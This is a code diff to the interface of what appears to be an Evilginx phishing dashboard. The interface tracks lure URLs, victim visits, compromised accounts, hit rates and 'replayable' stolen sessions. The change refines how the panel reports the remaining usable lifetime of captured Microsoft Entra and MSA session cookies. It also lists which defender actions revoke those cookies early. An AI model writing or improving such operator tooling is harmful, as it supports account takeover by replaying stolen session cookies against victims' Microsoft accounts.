@@ -324,8 +324,12 @@ const I18N = {
     lure_col:"URL", visits_col:"Visits", valid_col:"Replayable", victims_col:"Accounts", conv_col:"Hit rate",
     no_lures:"No lure data yet.", unknown:"(unknown)",
     ttl_session:"browser session", ttl_expired:"expired", ttl_est:"est.",
-    ttl_typical:"Typical lifetime — Evilginx does not store Max-Age. Entra persistent ≈ 90d, MSA persistent ≈ 1y. Tenant policy can cut this short.",
-    ttl_session_t:"Cookie dies when the victim closes the browser.",
+    ttl_idle90:"≤90d idle", ttl_idle24:"≤24h / browser", ttl_persist:"persistent (no published Max-Age)",
+    ttl_idle90_t:"Entra persistent SSO: 90-day max inactivity, rolling (use it and the window resets). Absolute max is until-revoked. Conditional Access, password reset or Revoke-MgUserSignInSession kill it sooner. Not a hard 90 days from capture.",
+    ttl_idle24_t:"Non-persistent ESTSAUTH: 24 hours or until the browser is closed (Microsoft KMSI docs).",
+    ttl_persist_t:"MSA __Host-MSAAUTHP is persistent (survives browser close). Microsoft does not publish Max-Age for it. A 1-year figure was wrong. The IdP can invalidate it at any time.",
+    ttl_session_t:"No Expires on the cookie — it dies when the browser closes.",
+    ttl_typical:"JWT exp when present; otherwise Microsoft session model, not a countdown.",
     ttl_days:n=>n+'d left', ttl_hours:n=>n+'h left', ttl_mins:n=>n+'m left',
     expires_k:"Expires",
     url_ph:"https://login.your-domain.com/xxxx", label_ph:"label", add:"Add", active_only:"Up only",
@@ -379,8 +383,12 @@ const I18N = {
     lure_col:"URL", visits_col:"Visitas", valid_col:"Rejugables", victims_col:"Cuentas", conv_col:"Conversión",
     no_lures:"Sin lures todavía.", unknown:"(desconocido)",
     ttl_session:"sesión (navegador)", ttl_expired:"caducada", ttl_est:"est.",
-    ttl_typical:"Vida típica — Evilginx no guarda el Max-Age. Entra persistente ≈ 90d, MSA persistente ≈ 1 año. El tenant puede acortarlo.",
-    ttl_session_t:"La cookie muere cuando la víctima cierra el navegador.",
+    ttl_idle90:"≤90d sin uso", ttl_idle24:"≤24h / navegador", ttl_persist:"persistente (sin Max-Age publicado)",
+    ttl_idle90_t:"SSO persistente de Entra: máximo 90 días de inactividad, ventana rolling (si se usa, se renueva). El máximo absoluto es hasta revocación. Conditional Access, reset de password o Revoke-MgUserSignInSession la matan antes. No es un plazo fijo de 90 días desde la captura.",
+    ttl_idle24_t:"ESTSAUTH no persistente: 24 horas o hasta cerrar el navegador (docs KMSI de Microsoft).",
+    ttl_persist_t:"__Host-MSAAUTHP es persistente (sobrevive al cerrar el navegador). Microsoft no publica Max-Age. El año era una cifra inventada. El IdP puede invalidarla cuando quiera.",
+    ttl_session_t:"La cookie no trae Expires: muere al cerrar el navegador.",
+    ttl_typical:"exp de JWT si viene; si no, el modelo de sesión de Microsoft, no una cuenta atrás.",
     ttl_days:n=>n+'d restantes', ttl_hours:n=>n+'h restantes', ttl_mins:n=>n+'m restantes',
     expires_k:"Caduca",
     url_ph:"https://login.tu-dominio.com/xxxx", label_ph:"etiqueta", add:"Añadir", active_only:"Solo arriba",
@@ -463,17 +471,18 @@ function ttlLabel(secs) {
 }
 function ttlCell(s) {
   if (!s || !s.valid) return '<span class="mut">—</span>';
-  if (s.ttl_kind === 'session' || (!s.expires && s.ttl_kind !== 'parsed')) {
-    if (s.ttl_kind === 'unknown') return '<span class="mut">—</span>';
-    return `<span class="mut" title="${t('ttl_session_t')}">${t('ttl_session')}</span>`;
+  const kind = s.ttl_kind || '';
+  if (kind === 'parsed' && s.expires) {
+    const left = s.expires - Date.now() / 1000;
+    const tip = absTime(s.expires);
+    if (left <= 0) return `<span title="${esc(tip)}">${t('ttl_expired')}</span>`;
+    return `<span class="num" title="${esc(tip)}">${ttlLabel(left)}</span>`;
   }
-  if (!s.expires) return '<span class="mut">—</span>';
-  const left = s.expires - Date.now() / 1000;
-  const when = absTime(s.expires);
-  const tip = when + (s.ttl_kind === 'typical' ? ' · ' + t('ttl_typical') : '');
-  if (left <= 0) return `<span title="${esc(tip)}">${t('ttl_expired')}</span>`;
-  const est = s.ttl_kind === 'typical' ? ` <span class="mut">${t('ttl_est')}</span>` : '';
-  return `<span class="num" title="${esc(tip)}">${ttlLabel(left)}${est}</span>`;
+  if (kind === 'idle90d') return `<span title="${t('ttl_idle90_t')}">${t('ttl_idle90')}</span>`;
+  if (kind === 'idle24h') return `<span title="${t('ttl_idle24_t')}">${t('ttl_idle24')}</span>`;
+  if (kind === 'persistent') return `<span title="${t('ttl_persist_t')}">${t('ttl_persist')}</span>`;
+  if (kind === 'session') return `<span class="mut" title="${t('ttl_session_t')}">${t('ttl_session')}</span>`;
+  return '<span class="mut">—</span>';
 }
 function serviceOf(s) {
   if (s.kind === 'entra') return 'Microsoft Entra';
